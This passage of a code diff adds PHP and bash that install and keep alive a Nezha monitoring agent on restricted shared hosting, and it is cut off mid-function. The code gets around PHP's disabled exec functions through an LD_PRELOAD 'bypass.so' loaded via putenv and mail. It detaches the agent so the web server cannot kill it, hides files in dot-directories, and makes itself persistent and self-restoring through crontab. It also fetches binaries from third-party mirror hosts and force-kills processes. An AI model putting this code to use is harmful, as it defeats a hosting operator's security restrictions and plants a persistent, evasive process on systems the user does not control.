+        $log[] = "[shell unzip]..."; runCmd("cd '$script_dir' && unzip -o '$zip' 2>&1");
+        if (file_exists("$script_dir/nezha-agent")) { @rename("$script_dir/nezha-agent", $agent); $extracted = true; }
+    }
+    @unlink($zip);
+    if ($extracted) { @chmod($agent, 0700); return ['ok'=>true, 'msg'=>"成功\n".implode("\n",$log)]; }
+    else return ['ok'=>false, 'msg'=>"解压失败\n".implode("\n",$log)];
+}
+
+// ================================================================
+//  六、启动
+// ================================================================
+
+// v8.10 新增：检测 ulimit -u，必要时清理同账号残留进程
+// 返回 ['limit' => 数字, 'current' => 数字, 'cleaned' => int, 'msg' => string]
+function _checkAndCleanupUlimit($agent) {
+    $info = ['limit' => 0, 'current' => 0, 'cleaned' => 0, 'msg' => ''];
+
+    // 1. 获取 ulimit -u（max user processes）
+    $ulimit_u = 0;
+    if (is_readable('/proc/self/limits')) {
+        $limits = @file_get_contents('/proc/self/limits');
+        if (preg_match('/Max processes.*?(\d+)/', $limits, $m)) {
+            $ulimit_u = intval($m[1]);
+        }
+    }
+    if (!$ulimit_u && !empty($GLOBALS['EXEC_METHODS'])) {
+        $r = runCmd("ulimit -u 2>/dev/null");
+        if (is_numeric(trim($r['output']))) $ulimit_u = intval(trim($r['output']));
+    }
+    $info['limit'] = $ulimit_u;
+
+    // 2. 获取当前进程数
+    $current_procs = 0;
+    if (is_dir('/proc') && is_readable('/proc')) {
+        $my_uid = function_exists('posix_getuid') ? @posix_getuid() : 0;
+        foreach (@scandir('/proc') ?: [] as $pd) {
+            if (!is_numeric($pd) || $pd < 1) continue;
+            if ($my_uid) {
+                $stat = @file_get_contents("/proc/$pd/status");
+                if ($stat && preg_match('/Uid:\s*(\d+)/', $stat, $m) && intval($m[1]) === $my_uid) {
+                    $current_procs++;
+                }
+            } else {
+                $current_procs++;
+            }
+        }
+    }
+    $info['current'] = $current_procs;
+
+    // 3. 判断是否需要清理
+    // Go 运行时最少需要 4 个 OS 线程，预留 8 个比较安全
+    $needed = 8;
+    if ($ulimit_u > 0 && ($ulimit_u - $current_procs) < $needed) {
+        // 需要清理：找到所有非当前的 nezha_agent / run.sh 残留进程
+        $cleaned = 0;
+        $agent_dir = dirname($agent);
+        if (is_dir('/proc') && is_readable('/proc')) {
+            $my_pid = getmypid();
+            foreach (@scandir('/proc') ?: [] as $pd) {
+                if (!is_numeric($pd) || $pd < 1 || $pd == $my_pid) continue;
+                $cl = @file_get_contents("/proc/$pd/cmdline");
+                if (!$cl) continue;
+                // 匹配 agent 本身或 run.sh（不是当前 PHP）
+                if (strpos($cl, '.nezha_agent') !== false
+                    || strpos($cl, 'nezha-agent') !== false
+                    || (strpos($cl, 'run.sh') !== false && strpos($cl, $agent_dir) !== false)) {
+                    // 通过 LD_PRELOAD 或 shell kill 杀掉
+                    if (!empty($GLOBALS['EXEC_METHODS'])) {
+                        @runCmd("kill -9 $pd 2>/dev/null");
+                    } elseif (!empty($GLOBALS['LD_PRELOAD_AVAILABLE']) && file_exists($GLOBALS['BYPASS_SO'])) {
+                        ldPreloadExec("kill -9 $pd", $GLOBALS['BYPASS_SO'], $GLOBALS['CMDFILE']);
+                    }
+                    $cleaned++;
+                }
+            }
+        }
+        $info['cleaned'] = $cleaned;
+        $info['msg'] = "ulimit={$ulimit_u}, current={$current_procs}, cleaned={$cleaned} stale procs";
+    } else {
+        $info['msg'] = $ulimit_u > 0
+            ? "ulimit={$ulimit_u}, current={$current_procs} (OK)"
+            : "ulimit unknown, current={$current_procs}";
+    }
+
+    return $info;
+}
+
+function launchDirect($agent, $config, $logfile) {
+    global $EXEC_METHODS, $LD_PRELOAD_AVAILABLE, $BYPASS_SO, $CMDFILE, $FUNC;
+    if (!file_exists($agent)) return ['ok'=>false, 'msg'=>'二进制不存在'];
+    if (!is_executable($agent)) @chmod($agent, 0700);
+
+    // v8.10: 优化 Go 环境变量，减少 OS 线程数（适配 ulimit -u 严格的共享主机）
+    // GOMAXPROCS=1: 只用 1 个 CPU 核心，减少调度线程
+    // GOMEMLIMIT=128MiB: 限制内存，减少 GC 压力
+    // GODEBUG=asyncpreemptoff=1: 关闭异步抢占（减少信号处理线程）
+    // GOGC=200: 降低 GC 频率（默认 100，改为 200 减少 GC 线程活动）
+    $env_prefix = 'env GOMAXPROCS=1 GOMEMLIMIT=128MiB GODEBUG=asyncpreemptoff=1 GOGC=200 ';
+
+    // v8.10: 启动前检测 ulimit -u，如果太低就提前清理同账号残留进程
+    $ulimit_info = _checkAndCleanupUlimit($agent);
+
+    // v8.5: agent 启动命令（不依赖 setsid 命令，bypass.so 会自己 setsid）
+    $agent_cmd = $env_prefix . escapeshellarg($agent) . ' -c ' . escapeshellarg($config)
+               . ' </dev/null >> ' . escapeshellarg($logfile) . ' 2>&1';
+
+    $tried = [];
+
+    // ========== 优先策略：如果 shell 执行被全禁，直接走 LD_PRELOAD ==========
+    // 你的环境：exec/system/passthru/shell_exec/proc_open/popen 全禁
+    // → 只能靠 LD_PRELOAD（putenv + mail 都可用）
+    if (empty($EXEC_METHODS)) {
+        if (!$LD_PRELOAD_AVAILABLE) {
+            return ['ok'=>false, 'msg'=>'❌ 所有 shell 执行函数被禁且 LD_PRELOAD 不可用。需要 putenv + mail/error_log 函数可用'];
+        }
+        if (!file_exists($BYPASS_SO) || filesize($BYPASS_SO) < 1000) {
+            return ['ok'=>false, 'msg'=>'❌ bypass.so 未就绪，请先点「🔧 准备绕过环境」按钮（自动下载/编译 .so）'];
+        }
+
+        // 用 daemon 模式启动 agent
+        // bypass.so 会：fork → setsid → 二次 fork → 重定向 fd → system(agent_cmd &)
+        // 这样 agent 完全脱离 PHP 进程组，LiteSpeed 杀不到
+        $tried[] = 'ld_preload+daemon';
+        ldPreloadExec($agent_cmd, $BYPASS_SO, $CMDFILE, true);
+        sleep(3);  // 等 fork + setsid + agent 启动
+        if (_checkProcAfterStart($agent)) {
+            return ['ok'=>true, 'msg'=>'✅ LD_PRELOAD+daemon 启动成功（bypass.so 内部 fork+setsid 脱离 PHP）'];
+        }
+
+        // 备用：非 daemon 模式（单次 fork）
+        $tried[] = 'ld_preload+single';
+        ldPreloadExec($agent_cmd . ' &', $BYPASS_SO, $CMDFILE, false);
+        sleep(3);
+        if (_checkProcAfterStart($agent)) {
+            return ['ok'=>true, 'msg'=>'✅ LD_PRELOAD 单 fork 启动成功'];
+        }
+
+        return ['ok'=>false, 'msg'=>'LD_PRELOAD 启动失败: '.implode(', ', $tried).'
+可能原因：
+1. bypass.so 版本太旧（v8.5 需要新版 .so，点「🔧 准备绕过环境」重新下载）
+2. /proc 不可读，无法检测进程（实际可能已启动）
+3. agent 二进制本身有问题（点「🚀 试运行」看输出）'];
+    }
+
+    // ========== 有 shell 执行能力时，走 v8.4 的 setsid 命令 ==========
+    $detached_cmd = "setsid bash -c " . escapeshellarg($agent_cmd . ' & echo $!') . " </dev/null >> /dev/null 2>&1";
+    $legacy_cmd = 'nohup ' . $env_prefix . $agent . ' -c ' . escapeshellarg($config) . ' >> ' . escapeshellarg($logfile) . ' 2>&1 &';
+
+    if (in_array('proc_open', $EXEC_METHODS)) {
+        $tried[] = 'proc_open+setsid';
+        $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
+        $p = @proc_open($detached_cmd, $d, $pipes);
+        if (is_resource($p)) {
+            fclose($pipes[0]);
+            $pid_out = '';
+            $start = microtime(true);
+            while ((microtime(true) - $start) < 1.5) {
+                $chunk = @fread($pipes[1], 1024);
+                if ($chunk) $pid_out .= $chunk;
+                if (strpos($pid_out, "\n") !== false) break;
+                usleep(50000);
+            }
+            fclose($pipes[1]); fclose($pipes[2]); @proc_close($p);
+
+            $pid = trim($pid_out);
+            if (is_numeric($pid) && $pid > 0) {
+                @file_put_contents(dirname($agent) . '/.nezha_pid', $pid);
+                @chmod(dirname($agent) . '/.nezha_pid', 0600);
+            }
+
+            sleep(2);
+            if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>"proc_open+setsid 成功 (PID=$pid)"];
+        }
+
+        $tried[] = 'proc_open+nohup';
+        $p = @proc_open($legacy_cmd, $d, $pipes);
+        if (is_resource($p)) { fclose($pipes[0]); sleep(3); @proc_close($p); if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'proc_open+nohup 成功']; }
+    }
+    if (in_array('popen', $EXEC_METHODS)) {
+        $tried[] = 'popen+setsid';
+        $fp = @popen($detached_cmd, 'r');
+        if ($fp) { $pid_out = @fread($fp, 1024); @pclose($fp); sleep(2); if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'popen+setsid 成功']; }
+    }
+    if (in_array('exec', $EXEC_METHODS)) {
+        $tried[] = 'exec+setsid';
+        @exec($detached_cmd, $out, $code);
+        sleep(2);
+        if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'exec+setsid 成功'];
+    }
+    if (in_array('shell_exec', $EXEC_METHODS)) {
+        $tried[] = 'shell_exec+setsid';
+        @shell_exec($detached_cmd);
+        sleep(2);
+        if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'shell_exec+setsid 成功'];
+    }
+
+    // LD_PRELOAD 兜底
+    if ($LD_PRELOAD_AVAILABLE && file_exists($BYPASS_SO) && filesize($BYPASS_SO) > 1000) {
+        $tried[] = 'ld_preload+daemon';
+        ldPreloadExec($agent_cmd, $BYPASS_SO, $CMDFILE, true);
+        sleep(3);
+        if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'LD_PRELOAD+daemon 启动成功'];
+    }
+
+    // v8.10: 失败时附加 ulimit 诊断信息
+    $err_msg = '所有方式均失败: '.implode(', ', $tried);
+    $err_msg .= "\n\n--- v8.10 ulimit 诊断 ---";
+    $err_msg .= "\n" . $ulimit_info['msg'];
+    if ($ulimit_info['limit'] > 0 && $ulimit_info['limit'] < 50) {
+        $err_msg .= "\n❌ ulimit -u 太低 ({$ulimit_info['limit']})，Go 运行时启动需要至少 8 个进程槽位";
+        $err_msg .= "\n   解决方案：";
+        $err_msg .= "\n   ① 联系主机商提高 ulimit -u（推荐 ≥100）";
+        $err_msg .= "\n   ② cPanel 用户：在 cPanel → Software → Multiphp INI Editor 查看是否可调";
+        $err_msg .= "\n   ③ 用 .htaccess 加 'RLimitMem' 指令试试（不一定生效）";
+        $err_msg .= "\n   ④ 换主机（这是最根本的解决方法）";
+    } elseif ($ulimit_info['limit'] > 0 && ($ulimit_info['limit'] - $ulimit_info['current']) < 8) {
+        $err_msg .= "\n⚠️ 进程槽位不足，已清理 {$ulimit_info['cleaned']} 个残留进程";
+        $err_msg .= "\n   建议再点一次「▶ 启动」试试";
+    }
+    $err_msg .= "\n（也可能是 LiteSpeed 强杀了进程，请用「自动保活」按钮）";
+
+    return ['ok'=>false, 'msg'=>$err_msg];
+}
+
+// v8.4 新增：启动后立即检测，找到 PID 写入 PID 文件
+// 启动场景下 PID 文件可能还没写，所以只看 /proc 遍历
+function _checkProcAfterStart($agent) {
+    if (!is_dir('/proc') || !is_readable('/proc')) return false;
+    $found_pid = 0;
+    foreach (@scandir('/proc') ?: [] as $pd) {
+        if (!is_numeric($pd) || $pd<1) continue;
+        $cl = @file_get_contents("/proc/$pd/cmdline");
+        if ($cl && (strpos($cl, '.nezha_agent') !== false || strpos($cl, 'nezha-agent') !== false)) {
+            $found_pid = $pd;
+            break;
+        }
+    }
+    if ($found_pid > 0) {
+        // 把 PID 写入 PID 文件，方便后续 detectProcess 用方法1验证
+        $pidfile = dirname($agent) . '/.nezha_pid';
+        @file_put_contents($pidfile, $found_pid);
+        @chmod($pidfile, 0600);
+        return true;
+    }
+    return false;
+}
+
+function _checkProc($agent) {
+    // 方法1: /proc 遍历
+    if (is_dir('/proc') && is_readable('/proc')) {
+        foreach (@scandir('/proc') ?: [] as $pd) {
+            if (!is_numeric($pd) || $pd<1) continue;
+            $cl = @file_get_contents("/proc/$pd/cmdline");
+            if ($cl && (strpos($cl, '.nezha_agent') !== false || strpos($cl, 'nezha-agent') !== false)) return true;
+        }
+    }
+    // 方法2: 日志文件检测（v8.2 收紧到 10s + 要求 PID 文件存在）
+    // agent 不持续写日志，30s 窗口在并发场景会误判
+    $logfile = dirname($agent) . '/.nezha_log';
+    $pidfile = dirname($agent) . '/.nezha_pid';
+    if (file_exists($logfile) && filesize($logfile) > 0 && file_exists($pidfile)) {
+        clearstatcache(true, $logfile);
+        $mtime = @filemtime($logfile);
+        if ($mtime && (time() - $mtime) < 10) return true;
+    }
+    return false;
+}
+
+// ================================================================
+//  七、进程检测
+// ================================================================
+
+function detectProcess($agent, $pidfile) {
+    $info = ['running'=>false, 'pids'=>[], 'pid_file'=>'-', 'method'=>'', 'detail'=>'未检测到', 'debug'=>''];
+    $logfile = dirname($agent) . '/.nezha_log';
+
+    // === 方法1: PID 文件 + /proc 验证 ===
+    if (file_exists($pidfile)) {
+        $pid = trim(file_get_contents($pidfile)); $info['pid_file'] = $pid;
+        if (is_numeric($pid) && $pid>0) {
+            if (is_dir("/proc/$pid") && is_readable("/proc/$pid/cmdline")) {
+                $cl = @file_get_contents("/proc/$pid/cmdline");
+                if ($cl && (strpos($cl, '.nezha_agent')!==false || strpos($cl, 'nezha-agent')!==false)) {
+                    $info['running']=true; $info['pids'][]=$pid; $info['method']='PID+/proc'; $info['detail']="PID $pid 存活"; return $info;
+                }
+                $info['debug'] = "PID文件有PID=$pid 但cmdline不匹配: ".bin2hex(substr($cl,0,80));
+            } else {
+                $info['debug'] = "PID文件有PID=$pid 但/proc不可读";
+            }
+        }
+    }
+
+    // === 方法2: /proc 遍历 ===
+    if (!$info['running'] && is_dir('/proc') && is_readable('/proc')) {
+        foreach (@scandir('/proc') ?: [] as $pd) {
+            if (!is_numeric($pd) || $pd<1) continue;
+            $cl = @file_get_contents("/proc/$pd/cmdline");
+            if ($cl && (strpos($cl, '.nezha_agent')!==false || strpos($cl, 'nezha-agent')!==false)) {
+                $info['running']=true; $info['pids'][]=$pd; if (!$info['method']) $info['method']='/proc遍历'; $info['detail']="PID=$pd";
+            }
+        }
+        if (!$info['running'] && empty($info['debug'])) {
+            $info['debug'] = '/proc可读但未找到nezha进程(可能权限不足只能看自己的)';
+        }
+    } elseif (!$info['running'] && empty($info['debug'])) {
+        $info['debug'] = '/proc不可读';
+    }
+
+    // === 方法3: shell pgrep ===
+    if (!$info['running'] && !empty($GLOBALS['EXEC_METHODS'])) {
+        $chk = runCmd("pgrep -f '.nezha_agent' 2>/dev/null");
+        $pids = array_filter(explode("\n", trim($chk['output'])));
+        // 【修复】pgrep 可能匹配到其他用户的 nezha 进程，必须二次验证
+        foreach ($pids as $pid) {
+            $pid = trim($pid);
+            if (!is_numeric($pid) || $pid < 1) continue;
+            // 二次验证：检查 /proc/PID/cmdline 或 /proc/PID/exe 是否指向当前 agent
+            $verified = false;
+            if (is_readable("/proc/$pid/cmdline")) {
+                $cl = @file_get_contents("/proc/$pid/cmdline");
+                // 检查 cmdline 是否包含当前 agent 的完整路径
+                if ($cl && (strpos($cl, $agent) !== false || strpos($cl, '.nezha_agent') !== false)) {
+                    $verified = true;
+                }
+            }
+            // 如果 /proc 不可读，检查 exe 链接
+            if (!$verified && is_readable("/proc/$pid/exe")) {
+                $exe = @readlink("/proc/$pid/exe");
+                if ($exe && strpos($exe, '.nezha_agent') !== false) {
+                    $verified = true;
+                }
+            }
+            if ($verified) {
+                $info['running'] = true;
+                $info['pids'][] = $pid;
+                if (!$info['method']) $info['method'] = 'pgrep+验证';
+            }
+        }
+        if (!$info['running'] && !empty($pids)) {
+            $info['debug'] = 'pgrep 找到 '.count($pids).' 个 PID 但验证均失败（可能是其他用户的 nezha 进程）';
+        }
+    }
+
+    // === 方法4: 日志文件活跃度检测（v8.2 收紧阈值） ===
+    // 注意：nezha agent 不持续写日志，只在启动/出错时写一行
+    //       所以 60s 窗口太宽，刚启动 agent 后 60s 内点别的按钮也会误判
+    //       收紧到 15s + 同时要求 PID 文件存在（双重验证）
+    if (!$info['running'] && file_exists($logfile) && filesize($logfile) > 0) {
+        clearstatcache(true, $logfile);
+        $mtime = @filemtime($logfile);
+        $age = $mtime ? (time() - $mtime) : 9999;
+        // 只在 PID 文件存在 + 日志 15s 内有更新时才判定运行（双重验证避免误判）
+        if ($mtime && $age < 15 && file_exists($pidfile)) {
+            $info['running'] = true;
+            $info['pids'][] = '(via logs)';   // 占位 PID
+            $info['method'] = '日志活跃度';
+            $info['detail'] = "日志 ${age}s 前更新且 PID 文件存在 (agent 可能在运行)";
+        } elseif ($mtime) {
+            $info['detail'] = "日志 ${age}s 前更新 (可能已停止)";
+        }
+    }
+
+    // === 方法5: 哪吒服务器 gRPC 连通性检测（v8.2 修复误判） ===
+    // 旧实现 BUG：只要 /proc/net/tcp 里有任意 :01BB 行（state=01）就判定 agent 在跑
+    //   但本 PHP 走 HTTPS/443 时，浏览器 ↔ LiteSpeed 的 ESTABLISHED 连接也是 :01BB state=01
+    //   → 用户只要打开面板就误判 agent 在跑（用户报告的 BUG）
+    // 修复思路：必须解析 nezha server hostname → IP，只匹配 rem_address = 该 IP 的 ESTABLISHED 行
+    if (!$info['running']) {
+        $nz_server = '';
+        if (file_exists(dirname($agent) . '/.nezha_config')) {
+            $cfg = @file_get_contents(dirname($agent) . '/.nezha_config');
+            if (preg_match('/^server:\s*"?([^"\s]+)"?/m', $cfg, $m)) $nz_server = $m[1];
+        }
+        if ($nz_server) {
+            $parts = explode(':', $nz_server);
+            $host = $parts[0];
+            $port = isset($parts[1]) ? intval($parts[1]) : 5555;
+            if (is_readable('/proc/net/tcp')) {
+                // 1. 把 nezha server hostname 解析成 IPv4
+                $ip = @gethostbyname($host);
+                if ($ip && filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
+                    // 2. /proc/net/tcp 的地址是 32位 hex 小端序，需要反转字节
+                    $ip_packed = @inet_pton($ip);   // 4 字节大端序
+                    if ($ip_packed !== false && strlen($ip_packed) === 4) {
+                        $ip_hex_le = bin2hex(strrev($ip_packed));   // 反转 → 小端 hex
+                        $port_hex  = sprintf('%04X', $port);
+                        $tcp = @file_get_contents('/proc/net/tcp');
+                        if ($tcp) {
+                            // 3. 严格解析每行，只匹配 rem_address = nezha_IP AND rem_port = nezha_port AND state = 01
+                            //    行格式:  sl local_address:port rem_address:port st ...
+                            foreach (explode("\n", $tcp) as $line) {
+                                if (!preg_match(
+                                    '/^\s*\d+:\s+[0-9A-Fa-f]{8}:[0-9A-Fa-f]{4}\s+([0-9A-Fa-f]{8}):([0-9A-Fa-f]{4})\s+(\d+)\s/',
+                                    $line, $m2
+                                )) continue;
+                                if ($m2[1] === strtoupper($ip_hex_le) && $m2[2] === $port_hex && $m2[3] === '01') {
+                                    $info['running'] = true;
+                                    $info['pids'][] = '(via tcp)';
+                                    $info['method'] = 'TCP连接检测';
+                                    $info['detail'] = "检测到本机到 $host($ip):$port 的活跃连接 (agent 在跑，但 PHP 权限不足无法获取真实 PID)";
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    return $info;
+}
+
+// ================================================================
+//  八、停止进程
+// ================================================================
+
+function stopProcess($agent, $pidfile) {
+    global $EXEC_METHODS, $LD_PRELOAD_AVAILABLE, $BYPASS_SO, $CMDFILE, $RUNSH;
+    $killed = [];
+    
+    // === 收集所有需要杀的 PID ===
+    $pids_to_kill = [];
+    
+    // 1. 从 PID 文件
+    if (file_exists($pidfile)) {
+        $pid = trim(file_get_contents($pidfile));
+        if (is_numeric($pid) && $pid>0) $pids_to_kill[] = $pid;
+        @unlink($pidfile);
+    }
+    
+    // 2. 从 /proc 遍历找本 PHP 代码产生的所有进程
+    //    匹配: .nezha_agent, run.sh, nezha-agent, 以及 PHP 启动的 shell 子进程
+    if (is_dir('/proc') && is_readable('/proc')) {
+        // 先收集当前目录下的所有相关进程
+        foreach (@scandir('/proc') ?: [] as $pd) {
+            if (!is_numeric($pd) || $pd<1) continue;
+            $cl = @file_get_contents("/proc/$pd/cmdline");
+            if (!$cl) continue;
+            $cl_str = str_replace("\0", ' ', $cl);
+            // 匹配 agent 本身
+            if (strpos($cl, $agent) !== false
+                || (strpos($cl, '.nezha_agent') !== false && strpos($cl, dirname($agent)) !== false)
+                || (strpos($cl, 'nezha-agent') !== false && strpos($cl, dirname($agent)) !== false)
+                || strpos($cl, $RUNSH) !== false) {
+                $pids_to_kill[] = $pd;
+            }
+        }
+        // 如果找到了 agent PID，还需要杀它的子进程
+        // 用 pstree 找子进程
+        if (!empty($pids_to_kill) && !empty($EXEC_METHODS)) {
+            foreach (array_unique($pids_to_kill) as $ppid) {
+                $chk = runCmd("pstree -p $ppid 2>/dev/null | grep -oP '\\d+' | head -20");
+                foreach (array_filter(explode("\n", trim($chk['output']))) as $cpid) {
+                    $cpid = trim($cpid);
+                    if (is_numeric($cpid) && $cpid > 0) $pids_to_kill[] = $cpid;
+                }
+            }
+        }
+    }
+    
+    // 3. 从 pgrep 补充（匹配 agent 路径和 run.sh）
+    if (!empty($EXEC_METHODS)) {
+        $chk = runCmd("pgrep -f " . escapeshellarg($agent) . " 2>/dev/null");
+        foreach (array_filter(explode("\n", trim($chk['output']))) as $pid) {
+            $pid = trim($pid);
+            if (is_numeric($pid) && $pid>0) $pids_to_kill[] = $pid;
+        }
+        $chk2 = runCmd("pgrep -f " . escapeshellarg($RUNSH) . " 2>/dev/null");
+        foreach (array_filter(explode("\n", trim($chk2['output']))) as $pid) {
+            $pid = trim($pid);
+            if (is_numeric($pid) && $pid>0) $pids_to_kill[] = $pid;
+        }
+    }
+    
+    $pids_to_kill = array_unique(array_filter($pids_to_kill));
+    
+    // === 执行杀进程 ===
+    foreach ($pids_to_kill as $pid) {
+        // 方式1: posix_kill（如果可用且不在禁用列表）
+        if (function_exists('posix_kill') && !in_array('posix_kill', array_map('trim', explode(',', @ini_get('disable_functions') ?: '')))) {
+            @posix_kill($pid, 9);
+            $killed[] = "posix_kill($pid)";
+        }
+        // 方式2: shell kill（多次确保）
+        if (!empty($EXEC_METHODS)) {
+            runCmd("kill -9 $pid 2>/dev/null");
+            $killed[] = "kill -9 $pid";
+        }
+        // 方式3: LD_PRELOAD kill
+        if ($LD_PRELOAD_AVAILABLE && empty($EXEC_METHODS)) {
+            ldPreloadExec("kill -9 $pid", $BYPASS_SO, $CMDFILE);
+            $killed[] = "kill $pid (bypass)";
+        }
+    }
+    
+    // === 杀整个进程组（关键！nohup/setsid 启动的进程组与父不同） ===
+    if (!empty($EXEC_METHODS) && !empty($pids_to_kill)) {
+        foreach ($pids_to_kill as $pid) {
+            runCmd("kill -9 -\$(ps -o pgid= -p $pid 2>/dev/null | tr -d ' ') 2>/dev/null");
+            $killed[] = "killpgid($pid)";
+        }
+    }
+    
+    // === 兜底：pkill 精确匹配 agent 路径和 run.sh ===
+    if (!empty($EXEC_METHODS)) {
+        runCmd("pkill -9 -f " . escapeshellarg($agent) . " 2>/dev/null");
+        $killed[] = 'pkill agent';
+        runCmd("pkill -9 -f " . escapeshellarg($RUNSH) . " 2>/dev/null");
+        $killed[] = 'pkill run.sh';
+    }
+    // LD_PRELOAD 兜底（v8.5：shell 全禁时唯一杀进程方式）
+    if ($LD_PRELOAD_AVAILABLE && empty($EXEC_METHODS) && file_exists($BYPASS_SO) && filesize($BYPASS_SO) > 1000) {
+        // 杀 agent
+        ldPreloadExec("pkill -9 -f " . escapeshellarg($agent), $BYPASS_SO, $CMDFILE);
+        $killed[] = 'pkill agent (bypass)';
+        // 杀 run.sh
+        ldPreloadExec("pkill -9 -f " . escapeshellarg($RUNSH), $BYPASS_SO, $CMDFILE);
+        $killed[] = 'pkill run.sh (bypass)';
+        // 杀进程组（每个 PID 都试）
+        foreach ($pids_to_kill as $pid) {
+            if (!is_numeric($pid) || $pid < 1) continue;
+            ldPreloadExec("kill -9 -\$(ps -o pgid= -p $pid 2>/dev/null | tr -d ' ') 2>/dev/null", $BYPASS_SO, $CMDFILE);
+            $killed[] = "killpgid($pid) (bypass)";
+        }
+    }
+    
+    sleep(1);
+    $p = detectProcess($agent, $pidfile);
+    return ['ok'=>!$p['running'], 'msg'=>!empty($killed)?implode(', ',$killed):'无可用方式', 'detail'=>$p];
+}
+
+// ================================================================
+//  九、配置 / run.sh
+// ================================================================
+
+function writeConfig($config, $server, $tls, $secret, $uuid, $uuidfile) {
+    if (file_exists($uuidfile)) { $u = trim(@file_get_contents($uuidfile)); if (preg_match('/^[0-9a-fA-F-]{36}$/', $u)) $uuid = $u; }
+    if (file_exists($config)) { $old = @file_get_contents($config); if (preg_match('/^uuid:\s*"?([0-9a-fA-F-]{36})"?/m', $old, $m)) { $uuid = $m[1]; @file_put_contents($uuidfile, $uuid); @chmod($uuidfile, 0600); } }
+    if (!file_exists($uuidfile)) { @file_put_contents($uuidfile, $uuid); @chmod($uuidfile, 0600); }
+    $content = "client_secret: \"{$secret}\"\nserver: \"{$server}\"\ntls: {$tls}\nuuid: \"{$uuid}\"\n";
+    return @file_put_contents($config, $content) !== false;
+}
+
+function generateRunSh($nz_server, $nz_tls, $nz_secret) {
+    $content = <<<'BASH'
+#!/bin/bash
+# ============================================================
+# 哪吒 Agent 自愈启动脚本 v8.5（可独立运行）
+# - 支持 start/stop/restart/cron/status/keepalive/log/install/uninstall 动作
+# - 配置已嵌入脚本（NZ_SERVER/TLS/SECRET），删 config 也能重建
+# - 自愈模式（cron / keepalive）：即使 .stfp/ 内所有文件被删也能恢复
+# - 可拷贝到任意目录独立运行（自动定位 .stfp 目录）
+#
+# 用法：
+#   bash run.sh start        启动 agent
+#   bash run.sh stop         停止 agent
+#   bash run.sh restart      重启
+#   bash run.sh status       查看状态
+#   bash run.sh cron         单次自愈检查（适合外部 cron 调用）
+#   bash run.sh keepalive    进入 4 小时循环保活模式（前台运行，可放 nohup 后台）
+#   bash run.sh log          查看最后 30 行日志
+#   bash run.sh install      把 cron 条目写入当前用户 crontab（每 4 小时执行 cron）
+#   bash run.sh uninstall    从 crontab 移除保活条目
+# ============================================================
+
+# ---- 自动定位 .stfp 目录 ----
+# 优先级：① 同目录下有 .stfp ② 上层目录有 .stfp（run.sh 在 .stfp 内）
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+if [ -d "$SCRIPT_DIR/.stfp" ]; then
+    STFP_DIR="$SCRIPT_DIR/.stfp"
+elif [ -d "$(dirname "$SCRIPT_DIR")/.stfp" ]; then
+    STFP_DIR="$(dirname "$SCRIPT_DIR")/.stfp"
+else
+    # 都没有，就在脚本所在目录创建 .stfp
+    STFP_DIR="$SCRIPT_DIR/.stfp"
+fi
+mkdir -p "$STFP_DIR" 2>/dev/null
+chmod 755 "$STFP_DIR" 2>/dev/null
+
+AGENT="$STFP_DIR/.nezha_agent"; CONFIG="$STFP_DIR/.nezha_config"; UUIDFILE="$STFP_DIR/.nezha_uuid"; PIDFILE="$STFP_DIR/.nezha_pid"; LOGFILE="$STFP_DIR/.nezha_log"
+KA_PIDFILE="$STFP_DIR/.nezha_keepalive_pid"
+NZ_SERVER="__NZ_SERVER__"; NZ_TLS="__NZ_TLS__"; NZ_CLIENT_SECRET="__NZ_SECRET__"
+NZ_ARCH="$(uname -m)"; [ "$NZ_ARCH" = "aarch64" ] && NZ_ARCH="arm64" || NZ_ARCH="amd64"
+
+log()    { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOGFILE" 2>/dev/null; }
+stdout() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"; }
+
+get_stable_uuid() {
+  [ -f "$UUIDFILE" ] && local u; u=$(cat "$UUIDFILE" 2>/dev/null) && echo "$u" | grep -qE '^[0-9a-fA-F-]{36}$' && NZ_UUID="$u" && return 0
+  [ -f "$CONFIG" ] && local u; u=$(grep '^uuid:' "$CONFIG" 2>/dev/null | head -1 | sed 's/^uuid: *"\?\([^"]*\)"\?/\1/') && echo "$u" | grep -qE '^[0-9a-fA-F-]{36}$' && NZ_UUID="$u" && echo "$u" > "$UUIDFILE" && return 0
+  local ip; ip=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || echo 127.0.0.1); local h; h=$(echo -n "nezha-$ip" | md5sum | awk '{print $1}')
+  NZ_UUID="${h:0:8}-${h:8:4}-4${h:13:3}-${h:16:4}-${h:20:12}"; echo "$NZ_UUID" > "$UUIDFILE"; chmod 600 "$UUIDFILE"
+}
+
+write_config() {
+  get_stable_uuid
+  cat > "$CONFIG" << EOF
+client_secret: "${NZ_CLIENT_SECRET}"
+server: "${NZ_SERVER}"
+tls: ${NZ_TLS}
+uuid: "${NZ_UUID}"
+EOF
+  chmod 600 "$CONFIG"
+}
+
+# 【自愈】下载 agent 二进制
+download_agent() {
+  log "下载 agent (arch=$NZ_ARCH)..."
+  local urls=(
+    "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${NZ_ARCH}.zip"
+    "https://ghgo.xyz/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${NZ_ARCH}.zip"
+    "https://mirror.ghproxy.com/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${NZ_ARCH}.zip"
+  )
+  local zip="$STFP_DIR/.nezha_download.zip"
+  for url in "${urls[@]}"; do
+    curl -sSL "$url" -o "$zip" --connect-timeout 15 --max-time 120 2>/dev/null
+    if [ -s "$zip" ] && [ "$(stat -c%s "$zip" 2>/dev/null || stat -f%z "$zip" 2>/dev/null || echo 0)" -gt 100000 ]; then
+      (cd "$STFP_DIR" && unzip -o "$zip" >/dev/null 2>&1)
+      [ -f "$STFP_DIR/nezha-agent" ] && mv "$STFP_DIR/nezha-agent" "$AGENT"
+      rm -f "$zip"
